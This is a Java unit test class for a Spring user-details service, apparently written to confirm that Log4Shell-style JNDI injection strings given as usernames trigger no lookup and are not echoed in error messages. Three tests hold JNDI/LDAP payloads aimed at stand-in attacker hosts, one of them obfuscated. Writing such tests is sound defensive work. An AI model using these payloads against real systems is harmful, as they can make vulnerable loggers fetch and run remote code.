package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("hashedpassword");
        testUser.setEnabled(true);
    }

    @Test
    void loadUserByUsername_withJndiInjectionPayload_shouldNotTriggerLookup() {
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections2}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(maliciousUsername);
        });

        verify(userService).findByUsername(maliciousUsername);
    }

    @Test
    void loadUserByUsername_withNestedJndiPayload_shouldNotTriggerLookup() {
        String maliciousUsername = "${${lower:j}ndi:ldap://attacker.com/a}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(maliciousUsername);
        });

        verify(userService).findByUsername(maliciousUsername);
    }

    @Test
    void loadUserByUsername_withValidUser_shouldReturnUserDetails() {
        when(userService.findByUsername("testuser")).thenReturn(testUser);

        UserDetails result = customUserDetailsService.loadUserByUsername("testuser");

        assertNotNull(result);
        assertEquals("testuser", result.getUsername());
        verify(userService).findByUsername("testuser");
    }

    @Test
    void loadUserByUsername_withNonExistentUser_shouldThrowException() {
        when(userService.findByUsername("nonexistent")).thenReturn(null);

        UsernameNotFoundException exception = assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername("nonexistent");
        });

        assertEquals("User not found", exception.getMessage());
    }

    @Test
    void loadUserByUsername_exceptionMessageShouldNotContainUsername() {
        String maliciousUsername = "${jndi:ldap://evil.com/a}";
        when(userService.findByUsername(maliciousUsername)).thenReturn(null);

        UsernameNotFoundException exception = assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(maliciousUsername);
        });

        assertFalse(exception.getMessage().contains(maliciousUsername));
        assertFalse(exception.getMessage().contains("${"));
    }
}
